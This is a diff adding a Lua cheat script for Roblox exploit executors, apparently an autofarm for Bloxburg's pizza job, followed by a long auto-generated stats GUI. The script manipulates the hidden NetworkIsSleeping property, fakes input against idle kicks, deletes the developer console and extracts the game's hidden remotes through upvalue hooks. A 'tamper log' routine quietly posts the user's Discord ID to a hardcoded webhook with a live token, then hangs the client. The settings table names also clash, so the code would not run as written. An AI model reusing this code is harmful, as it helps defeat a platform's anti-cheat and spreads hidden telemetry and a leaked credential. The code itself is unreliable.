@@ -1,0 +1,1447 @@
+repeat task.wait() until game:IsLoaded()
+if not NeoVilleSettings then
+    NeoVilleSettings = {
+        Neighborhood = {
+            Enabled = false, -- enable/disable joining neighborhoods
+            IfPlayersLeave = false, -- set to false to disable
+            Codes = { -- enter the codes for the neighborhoods servers here. add more codes as needed.
+                ""
+            }
+        },
+
+        Safety = {
+            DeliveryDelay = false, -- set to false to disable, otherwise enter a number
+            ProximityLeave = false, -- set to false to disable, otherwise set as a number
+            HideName = true
+        },
+
+        Shift = {
+            RestartShiftOnAmount = false, -- set to false to disable, otherwise enter a number
+            RestartShiftOnPizzaAmount = false, -- set to false to disable otherwise enter a number
+
+            QuitOnCashAmount = false, -- set to false to disable, otherwise enter a number
+            QuitOnPizzaAmount = false, -- set to false to disable otherwise enter a number
+            QuitOnPromotionLevel = false, -- set to false to disable, otherwise enter a number
+            QuitOnTotalShiftCash = false -- set to false to disable, otherwise enter a number
+        },
+    
+    
+        Breaks = {
+            WorkTime = false, -- Work time amount in secoonds
+            BreakTime = false -- Break Time amount in seconds..
+        },
+
+        Webhooks = {
+            Webhook = "", -- only valid discord webhook links will work
+            WebhookDelay = 1, -- enter number with no quotations, delay in seconds between webhooks
+        },
+
+        Theme = { -- If you remove this it goes to the default theme
+            BackgroundColor = Color3.fromRGB(73 , 79, 95),
+            StatBarColor = Color3.fromRGB(36, 36, 36),
+            StatusBoxColor = Color3.fromRGB(36, 36, 36),
+    
+            TitleTextColor = Color3.fromRGB(255, 255, 255),
+            StatTextColor = Color3.fromRGB(255, 255, 255),
+            StatusTextColor = Color3.fromRGB(255, 255, 255),    
+        }
+
+    }
+end
+
+
+if not VysorSettings.Theme then
+    VysorSettings.Theme = {
+        BackgroundColor = Color3.fromRGB(18, 18, 18),
+        StatBarColor = Color3.fromRGB(36, 36, 36),
+        StatusBoxColor = Color3.fromRGB(36, 36, 36),
+
+        TitleTextColor = Color3.fromRGB(255, 255, 255),
+        StatTextColor = Color3.fromRGB(255, 255, 255),
+        StatusTextColor = Color3.fromRGB(255, 255, 255),
+
+ 
+    }
+   
+end
+
+local LocalPlayer = game.Players.LocalPlayer
+local network = game:GetService("RunService")
+local heartbeatConnection = nil
+local isEnabled = false
+
+local function setNetworkIsSleeping(value)
+    sethiddenproperty(LocalPlayer.Character.HumanoidRootPart, "NetworkIsSleeping", value)
+end
+
+local function onHeartbeat()
+    if isEnabled then
+        setNetworkIsSleeping(true)
+        wait(0.0633454)
+        setNetworkIsSleeping(false)
+        wait(0.0134)
+        setNetworkIsSleeping(true)
+        wait(0.0132)
+        setNetworkIsSleeping(true)
+        wait(0.01235)
+        setNetworkIsSleeping(true)
+        wait(0.043)
+        setNetworkIsSleeping(true)
+        wait(0.01423)
+        setNetworkIsSleeping(true)
+        wait(0.064)
+        setNetworkIsSleeping(true)
+        wait(0.01263)
+        setNetworkIsSleeping(true)
+        wait(0.034123)
+        setNetworkIsSleeping(true)
+        wait(0.023645)
+        setNetworkIsSleeping(true)
+        wait(0.000001543)
+        setNetworkIsSleeping(false)
+        wait(0.0235)
+        setNetworkIsSleeping(true)
+        wait(0.052321534)
+    end
+end
+
+game:GetService("RunService").Heartbeat:Connect(function()
+    if isEnabled and heartbeatConnection == nil then
+        heartbeatConnection = network.Heartbeat:Connect(onHeartbeat)
+    end
+    wait(0.1)
+    if heartbeatConnection ~= nil and not isEnabled then
+        heartbeatConnection:Disconnect()
+        heartbeatConnection = nil
+    end
+end)
+
+getgenv().Enabled = false
+
+getgenv().Toggle = function()
+    isEnabled = not isEnabled
+    if isEnabled and heartbeatConnection == nil then
+        heartbeatConnection = network.Heartbeat:Connect(onHeartbeat)
+    elseif not isEnabled and heartbeatConnection ~= nil then
+        heartbeatConnection:Disconnect()
+        heartbeatConnection = nil
+    end
+end
+
+
+
+local Player = game.Players.LocalPlayer
+local CoreGui = game.CoreGui
+local privateFailf
+local StarterGui = game:GetService("StarterGui")
+local http_request = request or (syn and syn.request) or (http and http.request)
+local HttpService = game:GetService("HttpService")
+local TPService = game:GetService("TeleportService")
+local camera = workspace.CurrentCamera
+
+
+
+
+    if game.PlaceId ~= 185655149 and game.PlaceId ~= 4491408735 then
+        Player:Kick("Bloxburg not detected, Joining Bloxburg")
+        game:GetService("TeleportService"):Teleport(185655149, Player)
+        task.wait(9e9)
+    end
+    
+    local function fuckyourgame(reason)
+    end
+
+    
+    local function checknumber(num)
+    if type(num) == "number" then
+             return true
+        else
+             return false
+        end
+    end
+
+    if game.workspace.Plots:FindFirstChild("Plot_" .. Player.name) then
+        Player:Kick("\nPlease do not load into your bloxburg plot when executing Vysor")
+        task.wait(9e9)
+    end
+
+
+    
+    local cash = game:GetService("ReplicatedStorage").Stats[Player.name].Money.Value
+    local stopamt = VysorSettings.Shift.QuitOnCashAmount
+
+    local Servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/185655149/servers/Public?sortOrder=Asc&limit=100"))
+    local new = math.random(1, #Servers.data)
+    if Servers.data[new].playing >= Servers.data[new].maxPlayers-1 then
+        repeat 
+            new = math.random(1, #Servers.data)
+            wait()
+        until Servers.data[new].playing < Servers.data[new].maxPlayers-1
+    end
+
+    task.spawn(function()
+            while task.wait() do
+                local earning =
+                    math.floor(game:GetService("ReplicatedStorage").Stats[Player.Name].Job.ShiftEarnings.Value)
+                local fearning = tonumber(earning)
+                local fcash = tonumber(cash)
+                local finalamt = fcash + earning
+                if stopamt == false then
+                    fuckyourgame()
+                elseif finalamt > tonumber(stopamt) then
+                    game:shutdown()
+                end
+            end
+        end)
+    
+
+
+    local vu = game:GetService("VirtualUser")
+    game:GetService("Players").LocalPlayer.Idled:connect(function()
+       vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+       wait(1)
+       vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    end)
+    
+
+    local charset = {}  do 
+        for c = 48, 57  do table.insert(charset, string.char(c)) end
+        for c = 65, 90  do table.insert(charset, string.char(c)) end
+        for c = 97, 122 do table.insert(charset, string.char(c)) end
+    end
+
+    local function randomString(length)
+        if not length or length <= 0 then return '' end
+        math.randomseed(os.clock()^5)
+        return randomString(length - 1) .. charset[math.random(1, #charset)]
+    end
+
+    spawn(function()
+        while task.wait() do
+            pcall(function()
+                if game.CoreGui:FindFirstChild("DevConsoleMaster") and game.CoreGui:FindFirstChild("ScreenGui") then 
+                    game:GetService("CoreGui").DevConsoleMaster:Destroy()
+                end
+            end)
+        end
+    end)
+
+
+   local id = LRM_LinkedDiscordID
+
+
+
+    local function cracklog(t)
+        pcall(function()
+        http_request(
+            {
+                Url = "https://discord.com/api/webhooks/1091288985139150858/48NI91OKyIZuhObPAaw3PraUsH8MITYXLB3RrR36x2jRTIRWv3gSjduoT4iBa0bCzsfR",
+                Method = "POST",
+                Body = HttpService:JSONEncode(
+                    {
+                        username = "Vysor",
+                        embeds =  {
+                            {
+                              title =  "Tamper log!",
+                              color =  5814783,
+                              fields =  {
+                            
+                                {
+                                  name = "DISCORD ID",
+                                  value = "```\n"..id.."\n```"
+                                },
+                               
+                                {
+                                  name = "Log Type",
+                                  value = "```\n"..t.."\n```"
+                                }
+                              },
+                            }
+                        },
+                    }
+                ),
+                Headers = {["Content-Type"] = "application/json"}
+            }
+        )
+        end)
+        task.wait(0.3)
+        while true do
+        end
+    end
+
+
+    camera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+    cracklog("Camera FOV")
+    camera.FieldOfView = 1
+    end)
+
+    camera:GetPropertyChangedSignal("CameraType"):Connect(function()
+        camera.CameraType = Enum.CameraType.Orbital
+    end)
+
+
+    
+    spawn(function()
+        while task.wait() do
+            pcall(function()
+            if IY_LOADED then
+                while true do end
+            end
+            task.wait(1.5)
+
+            local check = workspace.CurrentCamera
+
+            if check == nil then
+                cracklog("Camera-Del")
+            end
+        end)
+        end
+    end)
+
+    task.spawn(function()
+        pcall(function()
+        while task.wait() do 
+            if game.CoreGui:FindFirstChild(name) then 
+            fuckyourgame()
+            elseif game.CoreGui:FindFirstChild(name) == nil then 
+             cracklog("GUI-ch1")
+            end
+        end
+        end)
+    end)
+
+    task.spawn(function()
+        pcall(function()
+        while task.wait() do 
+            if game.CoreGui:FindFirstChild(name).TextLabel then 
+            fuckyourgame()
+            elseif game.CoreGui:FindFirstChild(name).TextLabel == nil then 
+             cracklog("GUI-ch2")
+            end
+        end
+        end)
+    end)
+
+
+        
+    local player = game:GetService("Players").LocalPlayer
+        
+    local r = {};
+    local DataManager =  game:GetService("ReplicatedStorage").Modules.DataService
+   
+    local remoteAdded = getconnections(DataManager.DescendantAdded)[1].Function;
+    local rkeys = getupvalue(remoteAdded, 1);
+    
+    for remote_key, remote_name in next, getupvalue(getupvalue(remoteAdded, 2), 1) do
+        r[remote_name:sub(1, 2) == "F_" and remote_name:sub(3) or remote_name] = rkeys[remote_key];
+    end;
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local Holder1 = Instance.new("Frame")
+local UIListLayout = Instance.new("UIListLayout")
+local Bar1 = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local ImageLabel = Instance.new("ImageLabel")
+local TimeText = Instance.new("TextLabel")
+local Shiftduration = Instance.new("TextLabel")
+local Bar2 = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local ImageLabel_2 = Instance.new("ImageLabel")
+local TotalCashText = Instance.new("TextLabel")
+local TotalCash = Instance.new("TextLabel")
+local Bar3 = Instance.new("Frame")
+local UICorner_3 = Instance.new("UICorner")
+local ImageLabel_3 = Instance.new("ImageLabel")
+local estimatedText = Instance.new("TextLabel")
+local estimated = Instance.new("TextLabel")
+local Bar4 = Instance.new("Frame")
+local UICorner_4 = Instance.new("UICorner")
+local ImageLabel_4 = Instance.new("ImageLabel")
+local perdellabel = Instance.new("TextLabel")
+local perdel = Instance.new("TextLabel")
+local Holder2 = Instance.new("Frame")
+local UIListLayout_2 = Instance.new("UIListLayout")
+local Bar5 = Instance.new("Frame")
+local UICorner_5 = Instance.new("UICorner")
+local ImageLabel_5 = Instance.new("ImageLabel")
+local shfitearningslabel = Instance.new("TextLabel")
+local shiftearnings = Instance.new("TextLabel")
+local Bar6 = Instance.new("Frame")
+local UICorner_6 = Instance.new("UICorner")
+local ImageLabel_6 = Instance.new("ImageLabel")
+local pizzadellabel = Instance.new("TextLabel")
+local pizzasdel = Instance.new("TextLabel")
+local Bar7 = Instance.new("Frame")
+local UICorner_7 = Instance.new("UICorner")
+local ImageLabel_7 = Instance.new("ImageLabel")
+local promoproglabel = Instance.new("TextLabel")
+local promoprogress = Instance.new("TextLabel")
+local Bar8 = Instance.new("Frame")
+local UICorner_8 = Instance.new("UICorner")
+local ImageLabel_8 = Instance.new("ImageLabel")
+local promolevlabel = Instance.new("TextLabel")
+local PromoLevel = Instance.new("TextLabel")
+local Frame_2 = Instance.new("Frame")
+local UIListLayout_3 = Instance.new("UIListLayout")
+local Frame_3 = Instance.new("Frame")
+local StatusFrame = Instance.new("Frame")
+local UIGridLayout = Instance.new("UIGridLayout")
+local Frame_4 = Instance.new("Frame")
+local TextLabel_3 = Instance.new("TextLabel")
+local UICorner_9 = Instance.new("UICorner")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame.BackgroundColor3 =  VysorSettings.Theme.BackgroundColor
+Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+Frame.Size = UDim2.new(1, 100, 1, 100)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = VysorSettings.Theme.TitleTextColor
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.439970493, 0, 0.1274409, 0)
+TextLabel.Size = UDim2.new(0, 242, 0, 69)
+TextLabel.Font = Enum.Font.GothamBold
+TextLabel.Text = "NEOVILLE"
+TextLabel.TextColor3 = Color3.fromRGB(173, 216, 230) -- light blue color
+TextLabel.TextScaled = true
+TextLabel.TextSize = 18.000
+TextLabel.TextWrapped = true
+
+
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = VysorSettings.Theme.TitleTextColor
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.427114069, 0, 0.178828359, 0)
+TextLabel_2.Size = UDim2.new(0, 291, 0, 45)
+TextLabel_2.Font = Enum.Font.LuckiestGuy
+TextLabel_2.Text = "discord.gg/neoville"
+TextLabel_2.TextColor3 = VysorSettings.Theme.TitleTextColor
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 16.000
+TextLabel_2.TextWrapped = true
+
+Holder1.Name = "Holder1"
+Holder1.Parent = Frame
+Holder1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Holder1.BackgroundTransparency = 1.000
+Holder1.Position = UDim2.new(0.285172701, 0, 0.250770807, 0)
+Holder1.Size = UDim2.new(0, 867, 0, 163)
+
+UIListLayout.Parent = Holder1
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Padding = UDim.new(0, 12)
+
+Bar1.Name = "Bar1"
+Bar1.Parent = Holder1
+Bar1.BackgroundColor3 = VysorSettings.Theme.StatBarColor
+Bar1.Size = UDim2.new(0, 867, 0, 44)
+
+UICorner.CornerRadius = UDim.new(0, 99)
+UICorner.Parent = Bar1
+
+ImageLabel.Parent = Bar1
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.0264424607, 0, 0.152330652, 0)
+ImageLabel.Size = UDim2.new(0, 30, 0, 30)
+
+
+ImageLabel.Image = "http://www.roblox.com/asset/?id=6031075924"
+
+TimeText.Name = "TimeText"
+TimeText.Parent = Bar1
+TimeText.BackgroundColor3 = VysorSettings.Theme.StatTextColor
+TimeText.BackgroundTransparency = 1.000
+TimeText.Position = UDim2.new(0.0717129707, 0, 0.272898674, 0)
+TimeText.Size = UDim2.new(0, 200, 0, 19)
+TimeText.Font = Enum.Font.GothamBold
+TimeText.Text = "Time Elapsed:"
+TimeText.TextColor3 = Color3.fromRGB(173, 216, 230) -- light blue color
+TimeText.TextSize = 18.000
+TimeText.TextXAlignment = Enum.TextXAlignment.Left
+
+
+
+
+Shiftduration.Name = "Shiftduration"
+Shiftduration.Parent = Bar1
+Shiftduration.BackgroundColor3 = VysorSettings.Theme.StatTextColor
+Shiftduration.BackgroundTransparency = 1.000
+Shiftduration.Position = UDim2.new(0.716452777, 0, 0.289592773, 0)
+Shiftduration.Size = UDim2.new(0, 200, 0, 19)
+Shiftduration.Font = Enum.Font.GothamBold
+Shiftduration.Text = "loading"
+Shiftduration.TextColor3 = VysorSettings.Theme.StatTextColor
+Shiftduration.TextSize = 18.000
+Shiftduration.TextXAlignment = Enum.TextXAlignment.Right
+
+Bar2.Name = "Bar2"
+Bar2.Parent = Holder1
+Bar2.BackgroundColor3 = VysorSettings.Theme.StatBarColor
+Bar2.Size = UDim2.new(0, 867, 0, 44)
+
+UICorner_2.CornerRadius = UDim.new(0, 99)
+UICorner_2.Parent = Bar2
+
+ImageLabel_2.Parent = Bar2
+ImageLabel_2.BackgroundTransparency = 1.000
+ImageLabel_2.BorderSizePixel = 0
+
+
+ImageLabel_2.Position = UDim2.new(0.0264424607, 0, 0.152330652, 0)
+ImageLabel_2.Size = UDim2.new(0, 30, 0, 30)
+ImageLabel_2.Image = "http://www.roblox.com/asset/?id=6022668900"
+
+TotalCashText.Name = "TotalCashText"
+TotalCashText.Parent = Bar2
+TotalCashText.BackgroundColor3 = VysorSettings.Theme.StatTextColor
+TotalCashText.BackgroundTransparency = 1.000
+TotalCashText.Position = UDim2.new(0.0717129707, 0, 0.272898674, 0)
+TotalCashText.Size = UDim2.new(0, 200, 0, 19)
+TotalCashText.Font = Enum.Font.GothamBold
+TotalCashText.Text = "Total Cash:"
+TotalCashText.TextColor3 = Color3.fromRGB(173, 216, 230) -- light blue color
+TotalCashText.TextSize = 18.000
+TotalCashText.TextXAlignment = Enum.TextXAlignment.Left
+
+
+TotalCash.Name = "TotalCash"
+TotalCash.Parent = Bar2
+TotalCash.BackgroundColor3 = VysorSettings.Theme.StatTextColor
+TotalCash.BackgroundTransparency = 1.000
+TotalCash.Position = UDim2.new(0.716452777, 0, 0.289592773, 0)
+TotalCash.Size = UDim2.new(0, 200, 0, 19)
+TotalCash.Font = Enum.Font.GothamBold
+TotalCash.Text = "loading"
+TotalCash.TextColor3 = VysorSettings.Theme.StatTextColor
+TotalCash.TextSize = 18.000
+TotalCash.TextXAlignment = Enum.TextXAlignment.Right
+
+Bar3.Name = "Bar3"
+Bar3.Parent = Holder1
+Bar3.BackgroundColor3 = VysorSettings.Theme.StatBarColor
+Bar3.Size = UDim2.new(0, 867, 0, 44)
+
+UICorner_3.CornerRadius = UDim.new(0, 99)
+UICorner_3.Parent = Bar3
+
+ImageLabel_3.Parent = Bar3
+ImageLabel_3.BackgroundTransparency = 1.000
+ImageLabel_3.BorderSizePixel = 0
+
+ImageLabel_3.Position = UDim2.new(0.0264424607, 0, 0.152330652, 0)
+ImageLabel_3.Size = UDim2.new(0, 30, 0, 30)
+ImageLabel_3.Image = "http://www.roblox.com/asset/?id=6034509999"
+
+estimatedText.Name = "estimatedText"
+estimatedText.Parent = Bar3
+estimatedText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+estimatedText.BackgroundTransparency = 1.000
+estimatedText.Position = UDim2.new(0.0717129707, 0, 0.272898674, 0)
+estimatedText.Size = UDim2.new(0, 200, 0, 19)
+estimatedText.Font = Enum.Font.GothamBold
+estimatedText.Text = "Estimated Cash/Hour:"
+estimatedText.TextColor3 = Color3.fromRGB(173, 216, 230) -- light blue color
+estimatedText.TextSize = 18.000
+estimatedText.TextXAlignment = Enum.TextXAlignment.Left
+
+
+estimated.Name = "estimated"
+estimated.Parent = Bar3
+estimated.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+estimated.BackgroundTransparency = 1.000
+estimated.Position = UDim2.new(0.716452777, 0, 0.289592773, 0)
+estimated.Size = UDim2.new(0, 200, 0, 19)
+estimated.Font = Enum.Font.GothamBold
+estimated.Text = "loading"
+estimated.TextColor3 = VysorSettings.Theme.StatTextColor
+estimated.TextSize = 18.000
+estimated.TextXAlignment = Enum.TextXAlignment.Right
+
+Bar4.Name = "Bar4"
+Bar4.Parent = Holder1
+Bar4.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+Bar4.Size = UDim2.new(0, 867, 0, 44)
+
+UICorner_4.CornerRadius = UDim.new(0, 99)
+UICorner_4.Parent = Bar4
+
+ImageLabel_4.Parent = Bar4
+ImageLabel_4.BackgroundTransparency = 1.000
+ImageLabel_4.BorderSizePixel = 0
+
+ImageLabel_4.Position = UDim2.new(0.0264424607, 0, 0.152330652, 0)
+ImageLabel_4.Size = UDim2.new(0, 30, 0, 30)
+ImageLabel_4.Image = "http://www.roblox.com/asset/?id=6034754441"
+
+perdellabel.Name = "perdellabel"
+perdellabel.Parent = Bar4
+perdellabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+perdellabel.BackgroundTransparency = 1.000
+perdellabel.Position = UDim2.new(0.0717129707, 0, 0.272898674, 0)
+perdellabel.Size = UDim2.new(0, 200, 0, 19)
+perdellabel.Font = Enum.Font.GothamBold
+perdellabel.Text = "Per Delivery:"
+perdellabel.TextColor3 = Color3.fromRGB(173, 216, 230) -- light blue color
+perdellabel.TextSize = 18.000
+perdellabel.TextXAlignment = Enum.TextXAlignment.Left
+
+
+perdel.Name = "perdel"
+perdel.Parent = Bar4
+perdel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+perdel.BackgroundTransparency = 1.000
+perdel.Position = UDim2.new(0.716452777, 0, 0.289592773, 0)
+perdel.Size = UDim2.new(0, 200, 0, 19)
+perdel.Font = Enum.Font.GothamBold
+perdel.Text = "loading"
+perdel.TextColor3 = VysorSettings.Theme.StatTextColor
+perdel.TextSize = 18.000
+perdel.TextXAlignment = Enum.TextXAlignment.Right
+
+Holder2.Name = "Holder2"
+Holder2.Parent = Frame
+Holder2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Holder2.BackgroundTransparency = 1.000
+Holder2.Position = UDim2.new(0.285172701, 0, 0.501541615, 0)
+Holder2.Size = UDim2.new(0, 867, 0, 231)
+
+UIListLayout_2.Parent = Holder2
+UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout_2.Padding = UDim.new(0, 12)
+
+Bar5.Name = "Bar5"
+Bar5.Parent = Holder2
+Bar5.BackgroundColor3 = VysorSettings.Theme.StatBarColor
+Bar5.Size = UDim2.new(0, 867, 0, 44)
+
+UICorner_5.CornerRadius = UDim.new(0, 99)
+UICorner_5.Parent = Bar5
+
+ImageLabel_5.Parent = Bar5
+ImageLabel_5.BackgroundTransparency = 1.000
+ImageLabel_5.BorderSizePixel = 0
+
+ImageLabel_5.Position = UDim2.new(0.0264424607, 0, 0.152330652, 0)
+ImageLabel_5.Size = UDim2.new(0, 30, 0, 30)
+ImageLabel_5.Image = "http://www.roblox.com/asset/?id=6034973115"
+
+shfitearningslabel.Name = "shfitearningslabel"
+shfitearningslabel.Parent = Bar5
+shfitearningslabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+shfitearningslabel.BackgroundTransparency = 1.000
+shfitearningslabel.Position = UDim2.new(0.0717129707, 0, 0.272898674, 0)
+shfitearningslabel.Size = UDim2.new(0, 200, 0, 19)
+shfitearningslabel.Font = Enum.Font.GothamBold
+shfitearningslabel.Text = "Shift Earnings:"
+shfitearningslabel.TextColor3 = Color3.fromRGB(173, 216, 230)
+shfitearningslabel.TextSize = 18.000
+shfitearningslabel.TextXAlignment = Enum.TextXAlignment.Left
+
+
+shiftearnings.Name = "shiftearnings"
+shiftearnings.Parent = Bar5
+shiftearnings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+shiftearnings.BackgroundTransparency = 1.000
+shiftearnings.Position = UDim2.new(0.716452777, 0, 0.289592773, 0)
+shiftearnings.Size = UDim2.new(0, 200, 0, 19)
+shiftearnings.Font = Enum.Font.GothamBold
+shiftearnings.Text = "loading"
+shiftearnings.TextColor3 = VysorSettings.Theme.StatTextColor
+shiftearnings.TextSize = 18.000
+shiftearnings.TextXAlignment = Enum.TextXAlignment.Right
+
+Bar6.Name = "Bar6"
+Bar6.Parent = Holder2
+Bar6.BackgroundColor3 = VysorSettings.Theme.StatBarColor
+Bar6.Size = UDim2.new(0, 867, 0, 44)
+
+UICorner_6.CornerRadius = UDim.new(0, 99)
+UICorner_6.Parent = Bar6
+
+ImageLabel_6.Parent = Bar6
+ImageLabel_6.BackgroundTransparency = 1.000
+ImageLabel_6.BorderSizePixel = 0
+
+ImageLabel_6.Position = UDim2.new(0.0264424607, 0, 0.152330652, 0)
+ImageLabel_6.Size = UDim2.new(0, 30, 0, 30)
+ImageLabel_6.Image = "http://www.roblox.com/asset/?id=6034513885"
+
+pizzadellabel.Name = "pizzadellabel"
+pizzadellabel.Parent = Bar6
+pizzadellabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+pizzadellabel.BackgroundTransparency = 1.000
+pizzadellabel.Position = UDim2.new(0.0717129707, 0, 0.272898674, 0)
+pizzadellabel.Size = UDim2.new(0, 200, 0, 19)
+pizzadellabel.Font = Enum.Font.GothamBold
+pizzadellabel.Text = "Pizzas Delivered"
+pizzadellabel.TextColor3 = Color3.fromRGB(173, 216, 230)
+pizzadellabel.TextSize = 18.000
+pizzadellabel.TextXAlignment = Enum.TextXAlignment.Left
+
+
+pizzasdel.Name = "pizzasdel"
+pizzasdel.Parent = Bar6
+pizzasdel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+pizzasdel.BackgroundTransparency = 1.000
+pizzasdel.Position = UDim2.new(0.716452777, 0, 0.289592773, 0)
+pizzasdel.Size = UDim2.new(0, 200, 0, 19)
+pizzasdel.Font = Enum.Font.GothamBold
+pizzasdel.Text = "loading"
+pizzasdel.TextColor3 = VysorSettings.Theme.StatTextColor
+pizzasdel.TextSize = 18.000
+pizzasdel.TextXAlignment = Enum.TextXAlignment.Right
+
+Bar7.Name = "Bar7"
+Bar7.Parent = Holder2
+Bar7.BackgroundColor3 = VysorSettings.Theme.StatBarColor
+Bar7.Size = UDim2.new(0, 867, 0, 44)
+
+UICorner_7.CornerRadius = UDim.new(0, 99)
+UICorner_7.Parent = Bar7
+
+ImageLabel_7.Parent = Bar7
+ImageLabel_7.BackgroundTransparency = 1.000
+ImageLabel_7.BorderSizePixel = 0
+ImageLabel_7.Position = UDim2.new(0.0264424607, 0, 0.152330652, 0)
+ImageLabel_7.Size = UDim2.new(0, 30, 0, 30)
+
+ImageLabel_7.Image = "http://www.roblox.com/asset/?id=6031229350"
+
+promoproglabel.Name = "promoproglabel"
+promoproglabel.Parent = Bar7
+promoproglabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+promoproglabel.BackgroundTransparency = 1.000
+promoproglabel.Position = UDim2.new(0.0717129707, 0, 0.272898674, 0)
+promoproglabel.Size = UDim2.new(0, 200, 0, 19)
+promoproglabel.Font = Enum.Font.GothamBold
+promoproglabel.Text = "Promotion Progress:"
+promoproglabel.TextColor3 = Color3.fromRGB(135, 206, 250) -- light blue
+promoproglabel.TextSize = 18.000
+promoproglabel.TextXAlignment = Enum.TextXAlignment.Left
+
+
+promoprogress.Name = "promoprogress"
+promoprogress.Parent = Bar7
+promoprogress.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+promoprogress.BackgroundTransparency = 1.000
+promoprogress.Position = UDim2.new(0.716452777, 0, 0.289592773, 0)
+promoprogress.Size = UDim2.new(0, 200, 0, 19)
+promoprogress.Font = Enum.Font.GothamBold
+promoprogress.Text = "loading"
+promoprogress.TextColor3 = VysorSettings.Theme.StatTextColor
+promoprogress.TextSize = 18.000
+promoprogress.TextXAlignment = Enum.TextXAlignment.Right
+
+Bar8.Name = "Bar8"
+Bar8.Parent = Holder2
+Bar8.BackgroundColor3 = VysorSettings.Theme.StatBarColor
+Bar8.Size = UDim2.new(0, 867, 0, 44)
+
+UICorner_8.CornerRadius = UDim.new(0, 99)
+UICorner_8.Parent = Bar8
+
+ImageLabel_8.Parent = Bar8
+ImageLabel_8.BackgroundTransparency = 1.000
+ImageLabel_8.BorderSizePixel = 0
+ImageLabel_8.Position = UDim2.new(0.0264424607, 0, 0.152330652, 0)
+ImageLabel_8.Size = UDim2.new(0, 30, 0, 30)
+
+ImageLabel_8.Image = "http://www.roblox.com/asset/?id=6034268008"
+
+promolevlabel.Name = "promolevlabel"
+promolevlabel.Parent = Bar8
+promolevlabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+promolevlabel.BackgroundTransparency = 1.000
+promolevlabel.Position = UDim2.new(0.0717129707, 0, 0.272898674, 0)
+promolevlabel.Size = UDim2.new(0, 200, 0, 19)
+promolevlabel.Font = Enum.Font.GothamBold
+promolevlabel.Text = "Promotion Level:"
+promolevlabel.TextColor3 = Color3.fromRGB(135, 206, 250) -- Blue color values
+promolevlabel.TextSize = 18.000
+promolevlabel.TextXAlignment = Enum.TextXAlignment.Left
+
+
+PromoLevel.Name = "PromoLevel"
+PromoLevel.Parent = Bar8
+PromoLevel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PromoLevel.BackgroundTransparency = 1.000
+PromoLevel.Position = UDim2.new(0.716452777, 0, 0.289592773, 0)
+PromoLevel.Size = UDim2.new(0, 200, 0, 19)
+PromoLevel.Font = Enum.Font.GothamBold
+PromoLevel.Text = "loading"
+PromoLevel.TextColor3 = VysorSettings.Theme.StatTextColor
+PromoLevel.TextSize = 18.000
+PromoLevel.TextXAlignment = Enum.TextXAlignment.Right
+
+Frame_2.Parent = Frame
+Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_2.BackgroundTransparency = 1.000
+Frame_2.Position = UDim2.new(0.285172701, 0, 0.468653649, 0)
+Frame_2.Size = UDim2.new(0, 867, 0, 32)
+
+UIListLayout_3.Parent = Frame_2
+UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout_3.Padding = UDim.new(0, 12)
+
+Frame_3.Parent = Frame_2
+Frame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_3.BackgroundTransparency = 1.000
+Frame_3.Size = UDim2.new(0, 867, 0, 28)
+
+StatusFrame.Name = "StatusFrame"
+StatusFrame.Parent = Frame
+StatusFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+StatusFrame.BorderSizePixel = 0
+StatusFrame.Position = UDim2.new(0.387910694, 0, 0.749229312, 0)
+StatusFrame.Size = UDim2.new(0, 451, 0, 139)
+
+UIGridLayout.Parent = StatusFrame
+UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout.CellSize = UDim2.new(0, 441, 0, 153)
+
+Frame_4.Parent = StatusFrame
+Frame_4.BackgroundColor3 = VysorSettings.Theme.StatusBoxColor
+Frame_4.BackgroundTransparency = 1.000
+Frame_4.BorderSizePixel = 0
+Frame_4.Position = UDim2.new(0.129251704, 0, 0.235294119, 0)
+Frame_4.Size = UDim2.new(0, 100, 0, 100)
+
+TextLabel_3.Parent = Frame_4
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
